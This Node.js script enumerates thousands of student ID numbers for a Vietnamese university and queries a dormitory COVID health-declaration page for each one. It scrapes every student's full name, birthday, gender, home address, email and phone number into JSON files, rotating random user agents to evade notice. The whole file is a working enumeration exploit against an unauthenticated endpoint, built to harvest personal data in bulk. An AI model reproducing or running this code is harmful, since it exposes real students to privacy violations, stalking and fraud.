const axios = require('axios')
const cheerio = require('cheerio')
const fs = require('fs')
const useragent = require('random-useragent')

// get all possible student codes in UIT: 19520000 -> 19523000, 18520000 -> 18523000, 17520000 -> 17523000, 16520000 -> 16523000
function getAllMssv() {
  const heads = ['15', '16', '17', '18', '19']

  const array = Array.from({ length: 3000 }).map((_, index) => {
    const tail = '52' + index.toString().padStart(4, '0')
    return heads.map(x => x + tail)
  })

  return heads.reduce((acc, _, i) => {
    return [...acc, ...array.map(x => x[i])]
  }, [])
}

// convert a large array to multiple smaller chunks
function batchArray(array, batchSize) {
  console.assert(batchSize)

  return array.reduce(
    (acc, cur) => {
      const lastBatch = acc[acc.length - 1]

      if (lastBatch.length < batchSize) {
        lastBatch.push(cur)
      } else {
        acc.push([cur])
      }

      return acc
    },
    [[]]
  )
}

// call ajax and get info of a student, with his/her student code
async function getInfo(mssv) {
  const selectors = {
    codeNumber: '#CodeNumber',
    fullName: '#FullName',
    birthday: '#Birthday',
    gender: '#Gender',
    address: '#Address',
    email: '#Email',
    phone: '#Phone',
    universityName: '#UniversityName',
    dormitoryFullName: '#DormitoryFullName'
  }

  const html = await axios.get(
    `http://svktx.vnuhcm.edu.vn/Default/DiseaseDeclarationStudentWare?CodeNumber=${mssv}`,
    {
      timeout: 10000,
      headers: { 'User-Agent': useragent.getRandom() }
    }
  )
  const $ = cheerio.load(html.data)

  const hasInfo = !!$(selectors.codeNumber).val()
  if (!hasInfo) return undefined

  const info = { mssv }
  for (const [key, selector] of Object.entries(selectors)) {
    const val = $(selector).val()

    if (key === 'gender') {
      info[key] = val === 'true' ? 'Nữ' : 'Nam'
    } else {
      info[key] = val
    }
  }
  return info
}

async function main() {
  const studentCodes = batchArray(getAllMssv(), 100)

  for (const batch of studentCodes) {
    const batchedInfo = []

    for (let i = 0; i < batch.length; i++) {
      const mssv = batch[i]
      try {
        const info = await getInfo(mssv)
        info && batchedInfo.push(info) && console.log('got', mssv)
      } catch {
        console.log('failed at mssv =', mssv)
        i--
      }
    }

    fs.writeFileSync(
      `data_${batch[0]}.json`,
      JSON.stringify(batchedInfo, null, 2)
    )
  }
}

main()
